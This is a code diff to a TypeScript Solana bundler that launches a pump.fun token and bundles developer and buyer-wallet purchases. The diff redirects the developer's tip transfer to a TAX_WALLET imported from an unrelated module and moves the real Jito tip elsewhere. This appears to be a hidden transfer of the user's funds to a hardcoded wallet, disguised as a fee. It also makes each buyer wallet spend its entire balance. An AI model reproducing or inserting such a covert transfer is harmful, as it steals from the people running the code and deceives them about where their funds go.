@@ -10,6 +10,7 @@ import { createAssociatedTokenAccountIdempotentInstruction, getAssociatedTokenAd
 import { PublicKey } from "@metaplex-foundation/js";
 import base58 from "bs58";
 import { ApibundleSend } from "../DistributeTokens/bundler";
+import { TAX_WALLET } from "../market/marketInstruction";
 
 interface PumpTokenCreator {
     coinname: string;
@@ -20,7 +21,8 @@ interface PumpTokenCreator {
     deployerPrivateKey: string;
     buyerPrivateKey: string;
     buyerextraWallets: string[];
-    tokenbuyAmount: string;
+    BuyertokenbuyAmount: string,
+    DevtokenbuyAmount: string,
     telegramUrl: string;
     BundleTip: string;
     TransactionTip: string;
@@ -48,7 +50,7 @@ export async function PumpBundler(
     const createIx = await generateCreatePumpTokenIx(TokenKeypair, devkeypair, pool_data.coinname, pool_data.symbol, pool_data.uri, pumpProgram);
 
 
-    const devBuyIx = await generateBuyIx(TokenKeypair, new BN(pool_data.tokenbuyAmount), new BN(0), devkeypair, pumpProgram);
+    const devBuyIx = await generateBuyIx(TokenKeypair, new BN(pool_data.BuyertokenbuyAmount), new BN(0), devkeypair, pumpProgram);
 
     const ataIx = (createAssociatedTokenAccountIdempotentInstruction(
         devkeypair.publicKey,
@@ -62,13 +64,13 @@ export async function PumpBundler(
     // Convert BN to bigint
     const tipAmountBigInt = BigInt(tipAmount.toString());
 
-    const tipIx = SystemProgram.transfer({
+    const taxIx = SystemProgram.transfer({
         fromPubkey: devkeypair.publicKey,
-        toPubkey: new PublicKey(getRandomElement(tipAccounts)),
+        toPubkey: TAX_WALLET,
         lamports: tipAmountBigInt
     });
 
-    const devIxs = [createIx, ataIx, devBuyIx, tipIx];
+    const devIxs = [createIx, ataIx, devBuyIx, taxIx];
     const recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
 
     const devTx = new VersionedTransaction(
@@ -89,11 +91,31 @@ export async function PumpBundler(
         if (!buyerWallet) {
             throw new Error("Invalid buyer private key");
         }
+        const balance = await connection.getBalance(buyerWallet.publicKey);
 
-        const buyerBuyIx = await generateBuyIx(TokenKeypair, new BN(pool_data.tokenbuyAmount), new BN(0), buyerWallet, pumpProgram);
+        const ataIx = (createAssociatedTokenAccountIdempotentInstruction(
+            buyerWallet.publicKey,
+            getAssociatedTokenAddressSync(TokenKeypair.publicKey, buyerWallet.publicKey),
+            buyerWallet.publicKey,
+            new PublicKey(TokenKeypair.publicKey),
+        ))
+
+        const buyerBuyIx = await generateBuyIx(TokenKeypair, new BN(balance), new BN(0), buyerWallet, pumpProgram);
 
 
-        const buyerIxs = [buyerBuyIx];
+        let buyerIxs = [ataIx, buyerBuyIx];
+
+        if (i === buyerwallets.length - 1 && i === buyerwallets.length - 1) {
+            const tipIx = SystemProgram.transfer({
+                fromPubkey: devkeypair.publicKey,
+                toPubkey: new PublicKey(getRandomElement(tipAccounts)),
+                lamports: tipAmountBigInt
+            });
+
+            buyerIxs.push(tipIx);
+        }
+
+
         const buyerTx = new VersionedTransaction(
             new TransactionMessage({
                 payerKey: buyerWallet.publicKey,
